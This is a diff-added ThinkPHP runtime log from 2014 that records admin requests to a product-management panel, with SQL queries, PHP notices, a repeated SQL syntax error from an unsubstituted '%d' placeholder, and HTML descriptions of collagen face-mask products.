+[ 2014-10-10 15:05:13 ] 113.73.217.156 /admin.php/Product/selectChildProcate
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.001974s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002059s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001614s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001678s ]
+NOTIC: [8] Undefined index:  id D:\enkjhost\mayning1\web\admin\Lib\Action\ProductAction.class.php 第 253 行.
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004709s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=%d )  [ RunTime:0.000139s ]
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%d )' at line 1
+ [ SQL语句 ] : SELECT * FROM `procate` WHERE ( pid=%d ) 
+
+[ 2014-10-10 15:05:16 ] 113.73.217.156 /admin.php/Product/getProductDetail?id=112
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.001993s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002078s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001677s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001749s ]
+SQL: SHOW COLUMNS FROM `products` [ RunTime:0.004705s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004027s ]
+SQL: SELECT * FROM `products` WHERE ( id=112 ) LIMIT 1   [ RunTime:0.000324s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=0 )  [ RunTime:0.000232s ]
+SQL: SELECT * FROM `procate` WHERE ( id=31 ) LIMIT 1   [ RunTime:0.000169s ]
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.019758s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.019846s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.001483s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001422s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001269s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.001522s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.005896s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.001728s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001801s ]
+
+[ 2014-10-10 15:05:17 ] 113.73.217.156 /admin.php/Product/selectChildProcate?id=20
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.001981s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002066s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001614s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001680s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004862s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=20 )  [ RunTime:0.000287s ]
+
+[ 2014-10-10 15:05:44 ] 113.73.217.156 /admin.php/Product/addProduct
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.001979s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002065s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001622s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001697s ]
+SQL: SHOW COLUMNS FROM `products` [ RunTime:0.004607s ]
+SQL: UPDATE `products` SET `title`='Hyaluronic Acid Collagen Mask',`imgs`='/Public/upload/image/20140523/20140523102623_38413.jpg',`ctime`='2014-05-23 18:24',`sorts`=91,`details`='<p style=\"font-family:Arial, Verdana, sans-serif;color:#222222;\" class=\"p0\">\r\n	<strong><span style=\"font-family:arial, helvetica, sans-serif;\"><span style=\"color:#444443;font-size:21pt;\">Ice </span><span style=\"color:#444443;font-size:21pt;\">Lift </span><span style=\"color:#444443;font-size:21pt;\">Hydrating </span><span style=\"color:#444443;font-size:21pt;\">Collagen&nbsp;Mask</span></span></strong><span style=\"font-family:Verdana;color:#444443;font-size:21pt;\"></span> \r\n</p>\r\n<p style=\"font-family:Arial, Verdana, sans-serif;color:#222222;\" class=\"p0\">\r\n	<span style=\"color:#0000ff;\"><span style=\"font-size:16px;\"><span style=\"font-family:arial, helvetica, sans-serif;\">This&nbsp;intense,&nbsp;hydrating&nbsp;mask&nbsp;uses&nbsp;a&nbsp;variety&nbsp;of&nbsp;natural&nbsp;vegetable&nbsp;extracts&nbsp;to&nbsp;reduce&nbsp;the&nbsp;lines&nbsp;and&nbsp;wrinkles.&nbsp;Tightens&nbsp;and&nbsp;smoothens,&nbsp;leaving&nbsp;the&nbsp;skin&nbsp;looking&nbsp;firmer&nbsp;and&nbsp;more&nbsp;supple.&nbsp;&nbsp;A&nbsp;unique&nbsp;efficient&nbsp;penetration&nbsp;system&nbsp;with&nbsp;controlled&nbsp;release&nbsp;and&nbsp;a&nbsp;strong&nbsp;surface&nbsp;tension&nbsp;allows&nbsp;penetration&nbsp;of&nbsp;nutrients&nbsp;deep&nbsp;into&nbsp;the&nbsp;tender&nbsp;skin.&nbsp;This&nbsp;increases&nbsp;cellular&nbsp;moisture&nbsp;storage&nbsp;capacity,&nbsp;repair&nbsp;fibrous&nbsp;tissue,and&nbsp;enhance&nbsp;elasticity.</span></span></span><span style=\"font-family:Arial;font-size:10.5pt;\"></span> \r\n</p>\r\n<p style=\"font-family:Arial, Verdana, sans-serif;color:#222222;\">\r\n	<span style=\"font-family:arial, helvetica, sans-serif;\"><strong><span style=\"font-size:26px;\"></span></strong><strong><span style=\"font-size:26px;\">Application: </span></strong></span> \r\n</p>\r\n<p style=\"font-family:Arial, Verdana, sans-serif;color:#222222;\">\r\n	<br />\r\n</p>\r\n<p style=\"font-family:Arial, Verdana, sans-serif;color:#222222;\">\r\n	<span style=\"color:#0000ff;\"><span style=\"font-family:arial, helvetica, sans-serif;\"><span style=\"font-size:16px;\">Open&nbsp;foil&nbsp;pack,&nbsp;take&nbsp;out&nbsp;the&nbsp;face&nbsp;mask,&nbsp;unfold&nbsp;and&nbsp;place&nbsp;on&nbsp;cleansed&nbsp;face.&nbsp;Remove&nbsp;after 25 minutes.&nbsp;Do&nbsp;not&nbsp;rinse&nbsp;or&nbsp;cleanse </span></span><span style=\"font-family:arial, helvetica, sans-serif;font-size:16px;\">after&nbsp;use.&nbsp;Allow&nbsp;the&nbsp;remaining&nbsp;ingredients&nbsp;to&nbsp;be&nbsp;absorbed&nbsp;by&nbsp;the&nbsp;face.&nbsp;Massage&nbsp;in&nbsp;the&nbsp;remaining&nbsp;essence&nbsp;in&nbsp;the&nbsp;pack.</span></span> \r\n</p>\r\n<div style=\"font-family:Arial, Verdana, sans-serif;color:#222222;\">\r\n	<p>\r\n		<span style=\"font-family:arial, helvetica, sans-serif;\"><strong><span style=\"font-size:26px;\"></span></strong><span style=\"font-size:16px;\"><span style=\"font-size:26px;\"><strong>Shelf&nbsp;Life/Validity: </strong></span>3&nbsp;years</span></span> \r\n	</p>\r\n	<p>\r\n		<br />\r\n	</p>\r\n	<p>\r\n		<span style=\"font-family:arial, helvetica, sans-serif;\"><strong><span style=\"font-size:26px;\"></span></strong><strong><span style=\"font-size:26px;\">Cautions:</span></strong></span> \r\n	</p>\r\n	<p>\r\n		<span style=\"color:#0000ff;\"><span style=\"font-family:arial, helvetica, sans-serif;\"><span style=\"font-size:16px;\">Keep&nbsp;it&nbsp;out&nbsp;of&nbsp;reach&nbsp;of&nbsp;kids&nbsp;for&nbsp;fear&nbsp;that&nbsp;they&nbsp;might&nbsp;put&nbsp;it&nbsp;in&nbsp;mouths.</span></span></span> \r\n	</p>\r\n	<p>\r\n		<span style=\"color:#0000ff;\"><span style=\"font-family:arial, helvetica, sans-serif;\"><span style=\"font-size:16px;\">It&nbsp;might&nbsp;cause&nbsp;allergy&nbsp;on&nbsp;some&nbsp;human&nbsp;bodies.&nbsp;In&nbsp;case&nbsp;of&nbsp;discomfort,&nbsp;stop&nbsp;using&nbsp;it&nbsp;at&nbsp;once&nbsp;and&nbsp;consult&nbsp;the&nbsp;doctor.</span></span></span> \r\n	</p>\r\n	<div>\r\n		<span style=\"color:#0000ff;\"><span style=\"font-family:arial, helvetica, sans-serif;\"><span style=\"font-size:16px;\"><br />\r\n</span></span></span> \r\n	</div>\r\n</div>',`enable`=1,`proid`='31',`state`=0 WHERE ( id=112 ) [ RunTime:0.012909s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004158s ]
+NOTIC: [8] Undefined index:  name D:\enkjhost\mayning1\web\admin\Lib\Action\ProductAction.class.php 第 146 行.
+SQL: SELECT * FROM `procate` WHERE ( pid=0 ) ORDER BY sorts asc,pid asc  [ RunTime:0.000350s ]
+SQL: select count(a.id) as count from products a left join procate b on a.proid = b.id where 1=1  [ RunTime:0.000491s ]
+SQL: select a.id,a.title,a.ctime,a.imgs,a.sorts,a.enable,a.state,a.proid,b.title as protitle from products a left join procate b on a.proid = b.id where 1=1  order by a.sorts desc limit 0,10 [ RunTime:0.000782s ]
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.031080s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.031206s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.002092s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001895s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001674s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.002018s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.007934s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.002273s ]
+INFO: [ view_end ] --END-- [ RunTime:0.002368s ]
+
+[ 2014-10-10 15:05:44 ] 113.73.217.156 /admin.php/Product/selectChildProcate
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002604s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002714s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.002131s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.002216s ]
+NOTIC: [8] Undefined index:  id D:\enkjhost\mayning1\web\admin\Lib\Action\ProductAction.class.php 第 253 行.
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004476s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=%d )  [ RunTime:0.000143s ]
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%d )' at line 1
+ [ SQL语句 ] : SELECT * FROM `procate` WHERE ( pid=%d ) 
+
+[ 2014-10-10 15:05:47 ] 113.73.217.156 /admin.php/Product/getAllProductList/p/2?name=
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002620s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002729s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.002184s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.002279s ]
+SQL: SHOW COLUMNS FROM `products` [ RunTime:0.004969s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004287s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=0 ) ORDER BY sorts asc,pid asc  [ RunTime:0.000398s ]
+SQL: select count(a.id) as count from products a left join procate b on a.proid = b.id where 1=1  [ RunTime:0.000382s ]
+SQL: select a.id,a.title,a.ctime,a.imgs,a.sorts,a.enable,a.state,a.proid,b.title as protitle from products a left join procate b on a.proid = b.id where 1=1  order by a.sorts desc limit 10,10 [ RunTime:0.000534s ]
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.023887s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.023978s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.001593s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001435s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001273s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.001542s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.006039s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.001736s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001807s ]
+
+[ 2014-10-10 15:05:48 ] 113.73.217.156 /admin.php/Product/selectChildProcate
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002062s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002169s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001679s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001744s ]
+NOTIC: [8] Undefined index:  id D:\enkjhost\mayning1\web\admin\Lib\Action\ProductAction.class.php 第 253 行.
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004478s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=%d )  [ RunTime:0.000168s ]
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%d )' at line 1
+ [ SQL语句 ] : SELECT * FROM `procate` WHERE ( pid=%d ) 
+
+[ 2014-10-10 15:05:52 ] 113.73.217.156 /admin.php/Product/getAllProductList/p/3?name=
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.001998s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002084s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001633s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001706s ]
+SQL: SHOW COLUMNS FROM `products` [ RunTime:0.005137s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004263s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=0 ) ORDER BY sorts asc,pid asc  [ RunTime:0.000392s ]
+SQL: select count(a.id) as count from products a left join procate b on a.proid = b.id where 1=1  [ RunTime:0.000400s ]
+SQL: select a.id,a.title,a.ctime,a.imgs,a.sorts,a.enable,a.state,a.proid,b.title as protitle from products a left join procate b on a.proid = b.id where 1=1  order by a.sorts desc limit 20,10 [ RunTime:0.000646s ]
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.023966s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.024054s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.002481s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001482s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001278s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.001539s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.006978s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.001745s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001817s ]
+
+[ 2014-10-10 15:05:52 ] 113.73.217.156 /admin.php/Product/selectChildProcate
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.001983s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002069s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001613s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001677s ]
+NOTIC: [8] Undefined index:  id D:\enkjhost\mayning1\web\admin\Lib\Action\ProductAction.class.php 第 253 行.
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004968s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=%d )  [ RunTime:0.000165s ]
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%d )' at line 1
+ [ SQL语句 ] : SELECT * FROM `procate` WHERE ( pid=%d ) 
+
+[ 2014-10-10 15:05:55 ] 113.73.217.156 /admin.php/Product/getProductDetail?id=104
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.001986s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002071s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001626s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001697s ]
+SQL: SHOW COLUMNS FROM `products` [ RunTime:0.004742s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004208s ]
+SQL: SELECT * FROM `products` WHERE ( id=104 ) LIMIT 1   [ RunTime:0.000329s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=0 )  [ RunTime:0.000240s ]
+SQL: SELECT * FROM `procate` WHERE ( id=31 ) LIMIT 1   [ RunTime:0.000170s ]
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.019612s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.019700s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.001479s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001426s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001274s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.001526s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.005903s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.001732s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001805s ]
+
+[ 2014-10-10 15:05:55 ] 113.73.217.156 /admin.php/Product/selectChildProcate?id=20
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002203s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002295s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001791s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001862s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.005078s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=20 )  [ RunTime:0.000309s ]
+
+[ 2014-10-10 15:06:06 ] 113.73.217.156 /admin.php/Product/addProduct
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002002s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002088s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001635s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001708s ]
+SQL: SHOW COLUMNS FROM `products` [ RunTime:0.004627s ]
+SQL: UPDATE `products` SET `title`='Ice Lift Hydrating Collagen Mask',`imgs`='/Public/upload/image/20140522/20140522125934_75360.jpg',`ctime`='2014-05-22 20:59',`sorts`=92,`details`='<p style=\"font-family:Arial, Verdana, sans-serif;color:#222222;\" class=\"p0\">\r\n	<strong><span style=\"font-family:arial, helvetica, sans-serif;\"><span style=\"color:#444443;font-size:21pt;\">Ice </span><span style=\"color:#444443;font-size:21pt;\">Lift </span><span style=\"color:#444443;font-size:21pt;\">Hydrating </span><span style=\"color:#444443;font-size:21pt;\">Collagen&nbsp;Mask</span></span></strong><span style=\"font-family:Verdana;color:#444443;font-size:21pt;\"></span> \r\n</p>\r\n<p style=\"font-family:Arial, Verdana, sans-serif;color:#222222;\" class=\"p0\">\r\n	<span style=\"color:#0000ff;\"><span style=\"font-size:16px;\"><span style=\"font-family:arial, helvetica, sans-serif;\">This&nbsp;intense,&nbsp;hydrating&nbsp;mask&nbsp;uses&nbsp;a&nbsp;variety&nbsp;of&nbsp;natural&nbsp;vegetable&nbsp;extracts&nbsp;to&nbsp;reduce&nbsp;the&nbsp;lines&nbsp;and&nbsp;wrinkles.&nbsp;Tightens&nbsp;and&nbsp;smoothens,&nbsp;leaving&nbsp;the&nbsp;skin&nbsp;looking&nbsp;firmer&nbsp;and&nbsp;more&nbsp;supple.&nbsp;&nbsp;A&nbsp;unique&nbsp;efficient&nbsp;penetration&nbsp;system&nbsp;with&nbsp;controlled&nbsp;release&nbsp;and&nbsp;a&nbsp;strong&nbsp;surface&nbsp;tension&nbsp;allows&nbsp;penetration&nbsp;of&nbsp;nutrients&nbsp;deep&nbsp;into&nbsp;the&nbsp;tender&nbsp;skin.&nbsp;This&nbsp;increases&nbsp;cellular&nbsp;moisture&nbsp;storage&nbsp;capacity,&nbsp;repair&nbsp;fibrous&nbsp;tissue,and&nbsp;enhance&nbsp;elasticity.</span></span></span><span style=\"font-family:Arial;font-size:10.5pt;\"></span> \r\n</p>\r\n<p style=\"font-family:Arial, Verdana, sans-serif;color:#222222;\">\r\n	<span style=\"font-family:arial, helvetica, sans-serif;\"><strong><span style=\"font-size:26px;\"></span></strong><strong><span style=\"font-size:26px;\">Application: </span></strong></span> \r\n</p>\r\n<p style=\"font-family:Arial, Verdana, sans-serif;color:#222222;\">\r\n	<span style=\"color:#0000ff;\"><span style=\"font-family:arial, helvetica, sans-serif;\"><span style=\"font-size:16px;\">Open&nbsp;foil&nbsp;pack,&nbsp;take&nbsp;out&nbsp;the&nbsp;face&nbsp;mask,&nbsp;unfold&nbsp;and&nbsp;place&nbsp;on&nbsp;cleansed&nbsp;face.&nbsp;Remove&nbsp;after 25 minutes.&nbsp;Do&nbsp;not&nbsp;rinse&nbsp;or&nbsp;cleanse </span></span><span style=\"font-family:arial, helvetica, sans-serif;font-size:16px;\">after&nbsp;use.&nbsp;Allow&nbsp;the&nbsp;remaining&nbsp;ingredients&nbsp;to&nbsp;be&nbsp;absorbed&nbsp;by&nbsp;the&nbsp;face.&nbsp;Massage&nbsp;in&nbsp;the&nbsp;remaining&nbsp;essence&nbsp;in&nbsp;the&nbsp;pack.</span></span> \r\n</p>\r\n<div style=\"font-family:Arial, Verdana, sans-serif;color:#222222;\">\r\n	<p>\r\n		<span style=\"font-family:arial, helvetica, sans-serif;\"><strong><span style=\"font-size:26px;\"></span></strong><span style=\"font-size:16px;\"><span style=\"font-size:26px;\"><strong>Shelf&nbsp;Life/Validity: </strong></span>3&nbsp;years</span></span> \r\n	</p>\r\n	<p>\r\n		<br />\r\n	</p>\r\n	<p>\r\n		<span style=\"font-family:arial, helvetica, sans-serif;\"><strong><span style=\"font-size:26px;\"></span></strong><strong><span style=\"font-size:26px;\">Cautions:</span></strong></span> \r\n	</p>\r\n	<p>\r\n		<span style=\"color:#0000ff;\"><span style=\"font-family:arial, helvetica, sans-serif;\"><span style=\"font-size:16px;\">Keep&nbsp;it&nbsp;out&nbsp;of&nbsp;reach&nbsp;of&nbsp;kids&nbsp;for&nbsp;fear&nbsp;that&nbsp;they&nbsp;might&nbsp;put&nbsp;it&nbsp;in&nbsp;mouths.</span></span></span> \r\n	</p>\r\n	<p>\r\n		<span style=\"color:#0000ff;\"><span style=\"font-family:arial, helvetica, sans-serif;\"><span style=\"font-size:16px;\">It&nbsp;might&nbsp;cause&nbsp;allergy&nbsp;on&nbsp;some&nbsp;human&nbsp;bodies.&nbsp;In&nbsp;case&nbsp;of&nbsp;discomfort,&nbsp;stop&nbsp;using&nbsp;it&nbsp;at&nbsp;once&nbsp;and&nbsp;consult&nbsp;the&nbsp;doctor.</span></span></span> \r\n	</p>\r\n	<div>\r\n		<span style=\"color:#0000ff;\"><span style=\"font-family:arial, helvetica, sans-serif;\"><span style=\"font-size:16px;\"><br />\r\n</span></span></span> \r\n	</div>\r\n</div>',`enable`=1,`proid`='31',`state`=0 WHERE ( id=104 ) [ RunTime:0.010582s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004223s ]
+NOTIC: [8] Undefined index:  name D:\enkjhost\mayning1\web\admin\Lib\Action\ProductAction.class.php 第 146 行.
+SQL: SELECT * FROM `procate` WHERE ( pid=0 ) ORDER BY sorts asc,pid asc  [ RunTime:0.000360s ]
+SQL: select count(a.id) as count from products a left join procate b on a.proid = b.id where 1=1  [ RunTime:0.000361s ]
+SQL: select a.id,a.title,a.ctime,a.imgs,a.sorts,a.enable,a.state,a.proid,b.title as protitle from products a left join procate b on a.proid = b.id where 1=1  order by a.sorts desc limit 0,10 [ RunTime:0.000432s ]
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.030687s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.030797s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.002105s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001905s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001689s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.002022s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.007975s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.002304s ]
+INFO: [ view_end ] --END-- [ RunTime:0.002398s ]
+
+[ 2014-10-10 15:06:06 ] 113.73.217.156 /admin.php/Product/selectChildProcate
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002038s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002124s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001627s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001691s ]
+NOTIC: [8] Undefined index:  id D:\enkjhost\mayning1\web\admin\Lib\Action\ProductAction.class.php 第 253 行.
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004307s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=%d )  [ RunTime:0.000130s ]
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%d )' at line 1
+ [ SQL语句 ] : SELECT * FROM `procate` WHERE ( pid=%d ) 
+
+[ 2014-10-10 15:06:09 ] 113.73.217.156 /admin.php/Product/getAllProductList/p/2?name=
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002202s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002295s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001803s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001883s ]
+SQL: SHOW COLUMNS FROM `products` [ RunTime:0.005295s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004594s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=0 ) ORDER BY sorts asc,pid asc  [ RunTime:0.000427s ]
+SQL: select count(a.id) as count from products a left join procate b on a.proid = b.id where 1=1  [ RunTime:0.000419s ]
+SQL: select a.id,a.title,a.ctime,a.imgs,a.sorts,a.enable,a.state,a.proid,b.title as protitle from products a left join procate b on a.proid = b.id where 1=1  order by a.sorts desc limit 10,10 [ RunTime:0.000530s ]
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.030787s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.030888s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.002087s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001895s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001672s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.002019s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.007927s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.002285s ]
+INFO: [ view_end ] --END-- [ RunTime:0.002378s ]
+
+[ 2014-10-10 15:06:10 ] 113.73.217.156 /admin.php/Product/selectChildProcate
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002009s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002099s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001634s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001699s ]
+NOTIC: [8] Undefined index:  id D:\enkjhost\mayning1\web\admin\Lib\Action\ProductAction.class.php 第 253 行.
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004616s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=%d )  [ RunTime:0.000133s ]
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%d )' at line 1
+ [ SQL语句 ] : SELECT * FROM `procate` WHERE ( pid=%d ) 
+
+[ 2014-10-10 15:06:13 ] 113.73.217.156 /admin.php/Product/getProductDetail?id=111
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002606s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002717s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.002124s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.002220s ]
+SQL: SHOW COLUMNS FROM `products` [ RunTime:0.004957s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004243s ]
+SQL: SELECT * FROM `products` WHERE ( id=111 ) LIMIT 1   [ RunTime:0.000552s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=0 )  [ RunTime:0.000255s ]
+SQL: SELECT * FROM `procate` WHERE ( id=10 ) LIMIT 1   [ RunTime:0.000189s ]
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.022906s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.023009s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.002106s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001887s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001667s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.002025s ]
